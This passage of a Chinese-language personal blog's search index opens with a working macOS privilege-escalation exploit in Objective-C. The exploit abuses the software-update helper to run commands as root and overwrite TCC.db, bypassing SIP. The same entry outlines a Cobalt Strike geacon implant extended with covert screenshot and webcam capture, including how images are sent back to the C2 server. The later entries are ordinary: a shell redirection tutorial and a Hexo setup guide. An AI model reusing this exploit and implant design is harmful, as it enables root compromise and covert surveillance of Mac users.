title="提权程序，可以将需要提权的代码执行放到这里执行"></a>提权程序，可以将需要提权的代码执行放到这里执行</h2><ul><li>提权程序的核心是在一个更新包的可执行程序中，可以是一个脚本；</li><li>下面做的是需要将执行的指令放到更新包的可执行程序中，以脚本的形式运行；</li><li>osinstallersetupd程序是以root的身份运行的，所以其中的指令也是以root的形式运行；</li><li>将需要root权限的指令写进去即可，比如下面是覆盖TCC.db</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">///  clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd</span><br><br><span class="hljs-meta">#import <span class="hljs-string">&lt;Foundation/Foundation.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@protocol</span> <span class="hljs-title">SUHelperDProtocol</span></span><br><span class="hljs-comment">// some protocol methods</span><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">SUHelperProxy</span> : <span class="hljs-title">NSObject</span> &lt;<span class="hljs-title">SUHelperDProtocol</span>&gt;</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _suhelperd_port;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _client_port;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> _currentRights;<br>    <span class="hljs-built_in">NSObject</span>&lt;OS_dispatch_queue&gt; *_q;<br>    <span class="hljs-built_in">NSObject</span>&lt;OS_dispatch_source&gt; *clientPortDeadChecker;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> _recentRights;<br>&#125;<br><br>+ (<span class="hljs-type">id</span>)sharedHelperProxy;<br><span class="hljs-keyword">@property</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> recentRights; <span class="hljs-comment">// @synthesize recentRights=_recentRights;</span><br>- (<span class="hljs-type">void</span>)authorizeWithEmptyAuthorizationForRights:(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)arg1;<br>- (<span class="hljs-type">BOOL</span>) prepareInstallAssistantWithPath:(<span class="hljs-built_in">NSString</span> *)arg1;<br>- (<span class="hljs-type">id</span>) installAssistantPreparationStatus;<br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-type">int</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span> * argv[]) &#123;<br><br>    <span class="hljs-built_in">NSString</span> *modifyFile = <span class="hljs-string">@&quot;/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd&quot;</span>;<br>    <span class="hljs-built_in">NSString</span> *installAppPath = <span class="hljs-string">@&quot;/tmp/Applications/Install macOS Monterey beta.app&quot;</span>;<br>    <span class="hljs-built_in">NSString</span> *instr1 = <span class="hljs-string">@&quot;#!/bin/bash\nwhoami &amp;&gt; /Library/test_root\n&quot;</span>;<span class="hljs-comment">//Test root</span><br>    <span class="hljs-built_in">NSString</span> *instr2 = <span class="hljs-string">@&quot;/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/shove -X /tmp/crafted.db /Library/Application\\ Support/com.apple.TCC/TCC.db\n&quot;</span>;<span class="hljs-comment">//change tcc.db of system</span><br>    <br>    <span class="hljs-built_in">NSString</span> *instr = [instr1 stringByAppendingString:instr2];<span class="hljs-comment">//instr1 + instr2</span><br>    [instr writeToFile:modifyFile atomically:<span class="hljs-literal">TRUE</span> encoding:<span class="hljs-built_in">NSUTF8StringEncoding</span> error:<span class="hljs-literal">nil</span>];<br>    <br>    <span class="hljs-comment">// fire the hole</span><br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;all ready, we can go go go!&quot;</span>);<br>    <br>    SUHelperProxy *helper = [SUHelperProxy sharedHelperProxy];<br>    [helper authorizeWithEmptyAuthorizationForRights:<span class="hljs-number">4</span>];<br>    <br>    <span class="hljs-type">id</span> status = [helper installAssistantPreparationStatus];<br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;installAssistantPreparationStatus:%@&quot;</span>, status);<br>    <span class="hljs-comment">// will hang inside, waiting for XPC response</span><br>    [helper prepareInstallAssistantWithPath:installAppPath];<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="client程序就是我们编译好的geacon"><a href="#client程序就是我们编译好的geacon" class="headerlink" title="client程序就是我们编译好的geacon"></a>client程序就是我们编译好的geacon</h2><ul><li>前面做的工作是为了client能够正常运行</li><li>当能够正常运行client时，该mac机器就能够正常上线</li><li>这部分主要就是除了geacon的基本功能，还额外实现了截图和打开摄像头拍照，并且可以将图片回传至CobaltStrike上面。</li></ul><h1 id="三-geacon和自拓展功能"><a href="#三-geacon和自拓展功能" class="headerlink" title="(三)geacon和自拓展功能"></a>(三)geacon和自拓展功能</h1><h2 id="geacon实现"><a href="#geacon实现" class="headerlink" title="geacon实现"></a>geacon实现</h2><p>这部分待补【目前放在网盘里】</p><h2 id="截图功能"><a href="#截图功能" class="headerlink" title="截图功能"></a>截图功能</h2><p>这部分工作要依赖上面提到的提权和绕过SIP。</p><ul><li><p>提权：是为了以root用户的身份去执行一些命令</p></li><li><p>绕过SIP：上面提到在特定系统版本范围内，shove命令可以直接操作TCC.db，但是这是需要root权限，所以配合提权就可以替换掉TCC.db文件</p></li><li><p>TCC.db：在Mac中应用可能会需要各种权限，在使用这些权限之前它需要先向系统申请授予权限，得到权限后才能进一步使用对应的功能。而记录每个程序权限控制就记录在TCC.db中</p></li></ul><p>这里我们是直接使用Mac自带的截图命令来截取当前的屏幕内容，如果程序没有被授予截屏权限将不能截取到屏幕的内容，而仅能截取到屏幕的背景，所以我们想要截取屏幕的内容需要先授予截屏权限。授予权限我们是通过更改TCC.db中的数据来更改权限的，是借助提权和绕过SIP两个漏洞来进行的，下面的摄像头功能同样是如此。</p><h2 id="关于图片回传"><a href="#关于图片回传" class="headerlink" title="关于图片回传"></a>关于图片回传</h2><p>这部分是将图片回传至CobaltStrike上，之前在Windows端的图片回传是通过管道获取数据的，在Mac上如果回传的格式不对CobaltStrike是无法正确解析的，所以下面Mac上的图片回传是通过调试Windows端的geacon来进一步获取回传的格式。</p><p>回传的格式如下:<br>图片内容长度(4Byte) + 图片内容 + id(4Byte) + 窗口名字的长度(4Byte) + 窗口名字 + 用户名字长度(4Byte) + 用户名字</p><p>将图片打包成正确的格式，我实现在ding.mm文件中</p><h2 id="摄像头拍照"><a href="#摄像头拍照" class="headerlink" title="摄像头拍照"></a>摄像头拍照</h2><p>摄像头拍照功能是通过包含bmain.h文件来调用的，打开摄像头并拍照放在一个单独的模块进行实现的。</p><p>该功能通过三个模块实现的：<br>VideoCapturer<br>MyDelegate<br>bmain</p>]]></content>
    
    
    <categories>
      
      <category>MacOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重定向</title>
    <link href="/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <url>/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>准备好好看下重定向得从下面这条语句说起：<br>-strace命令用于监控和记录程序执行时的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">strace ./cast 2&gt;&amp;1 | grep -E &#x27;^write&#x27; | wc -l<br></code></pre></td></tr></table></figure><ul><li>   重定向描述符<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从输入和输出的角度看，<span class="hljs-built_in">cat</span>命令的输出的内容是其输入内容的直接复制</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span>命令后面可以跟文件名字来读取文件的内容并且输出，如果<span class="hljs-built_in">cat</span>后面没有文件名字则从标准输入中进行读取内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下面是从标准输入中读取内容，然后重定向输出到文件中，最后结束按ctrl + d</span><br>cat &gt; temp.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt; 是输入重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> &lt; filename，这样<span class="hljs-built_in">command</span>是从文件中读取而不是从标准输入读取</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面这条指令和 <span class="hljs-built_in">cat</span> filename.txt效果一样</span><br>cat &lt; filename.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;是输出重定向，指的是stdout重定向</span><br>ls &gt; test.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2&gt; 这是标准错误重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面将cast程序的错误输出保存到文件中</span><br>./cast 2&gt; errorOutput.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&amp;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&amp;这是重定向操作符，将一个文件描述符重定向至另一个文件描述符</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面是将cast程序的错误输出和正常输出都输出到标准输出中，然后再将内容输出到文件中</span><br>./cast 2&gt;&amp;1 &gt; allOutput.txt<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"> # </span><span class="language-bash">| 管道符</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">管道符是将前面一个命令的标准输出作为后面一个命令的标准输入</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">cmd1 | cmd2</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;&lt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">输入重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;&lt; <span class="hljs-string">identifier, 这个效果就是创建一个Here Document，允许定义一个多行字符串，并且以identifier</span>为结束标志</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如 &lt;&lt; <span class="hljs-string">eof，这允许我们输入一个多行字符串最后以eof</span>为结束标志</span><br>&lt;&lt;eof<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">123</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">456</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">789</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">eof</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下面是结合<span class="hljs-built_in">cat</span>、&gt;、&lt;&lt;来实现从标准输入中读取，并且保存到文件中</span><br>cat &gt; temp.txt &lt;&lt;eof<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&gt;输出重定向是用于追加内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接向一个文件尾部添加内容</span><br>echo &quot;sss&quot; &gt;&gt; temp.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接从标准输入中读取内容并且追加到文件中</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt; temp.txt &lt;&lt;<span class="hljs-string">eof</span></span><br><br><br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建</title>
    <link href="/2022/04/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/04/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="预准备"><a href="#预准备" class="headerlink" title="预准备"></a>预准备</h1><p>就是在电脑上安装一些所需的软件</p><ul><li><p>Git</p><p>根据不同的系统有不同的安装方式，可以根据自己的系统来，我这里是用Mac</p><p><code> brew install git </code></p></li><li><p>Node.js</p><p>也是有多种不同的方式，比如MacOS可以用homebrew</p><p><code> brew install node </code></p></li><li><p>Hexo</p><p>安装好Node.js后，使用下面指令来安装hexo</p><p><code> npm install -g hexo-cli </code></p><p>安装过程中可能会遇到网络问题，这时换下国内镜像源即可，下面是淘宝镜像</p><p><code> npm config set registry https://registry.npmmirror.com</code></p></li></ul><h1 id="初步使用Hexo"><a href="#初步使用Hexo" class="headerlink" title="初步使用Hexo"></a>初步使用Hexo</h1><ul><li><p>找一个位置创建我们的博客文件夹</p><p><code> mkdir Blog </code></p></li><li><p>进入Blog文件夹，使用hexo进行初始化</p><p><code> cd Blog </code></p><p><code> hexo init </code></p></li><li><p>这时已经初始化完成，可以使用下面指令测试一下</p><p><code> hexo s </code>打开server</p><p>在网页中http:&#x2F;&#x2F;localhost:4000进行访问，如果显示blog就正常</p></li><li><p>下载主题</p><p>正常如果是自己下载主题，需要将主题放在themes文件夹内</p><p>详情就是根据主题提供的方式来，这里我使用的是<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid主题</a>，所以使用npm安装<br><code> npm install --save hexo-theme-fluid</code><br>这样就会将hexo-theme-fluid安装到node_moudles文件夹内，当然还要同时创建一个对应主题的配置文件</p></li><li><p>配置主题<br>主要是_config.yml来掌控整个配置，比如选用哪个主题等等<br>具体主题还要有其对应的配置文件，比如这里是fluid的配置文件：_config.fluid.yml</p></li></ul><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="github的配置"><a href="#github的配置" class="headerlink" title="github的配置"></a>github的配置</h2><ul><li><p>创建一个githubPages仓库并进行相关设置</p></li><li><p>电脑端设置github的用户名和邮箱并生成rsa<br><code>git config --global user.name &quot;github用户名&quot;</code><br><code>git config --global user.email &quot;github注册的邮箱&quot;</code><br><code>ssh-keygen -t rsa -C &quot;github注册的邮箱&quot;</code>    </p></li><li><p>将本机生成的rsa设置到github仓库的上面<br><code>cat ~/.ssh/id_rsa.pub</code>将内容复制，进入github个人Settings中，SSH and GPG keys里面新建一个SSH keys粘贴进去即可</p></li><li><p>配置_config.yml，这里配置仓库链接时要注意使用ssh的形式，而不是https<br>在最下面添加:</p><blockquote></blockquote><pre><code class="hljs">deploy:        type: git        repository: 自己的仓库地址，选用ssh的那个        branch: main</code></pre></li></ul><h2 id="hexo生成相关的指令"><a href="#hexo生成相关的指令" class="headerlink" title="hexo生成相关的指令"></a>hexo生成相关的指令</h2><ul><li><p>如果之前存在生成的旧版本，先clean一下<br><code>hexo clean</code></p></li><li><p>先在Blog内进行生成<br><code>hexo g</code>是用来generate的，会对应生成一个public文件夹，一会是将该文件夹内的内容传至github</p></li><li><p>准备进行上传至github<br><code>hexo d</code>是用来deploy的，会根据_config.yml配置进行上传至github上面</p></li></ul><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>格式如下：</p><pre><code class="hljs">password: ******message: Pwn!!!</code></pre><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><pre><code class="hljs">#这个不显示图片参考：https://zhuanlan.zhihu.com/p/392900486?utm_id=0#解决：https://blog.csdn.net/McNeeley/article/details/131276010</code></pre><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
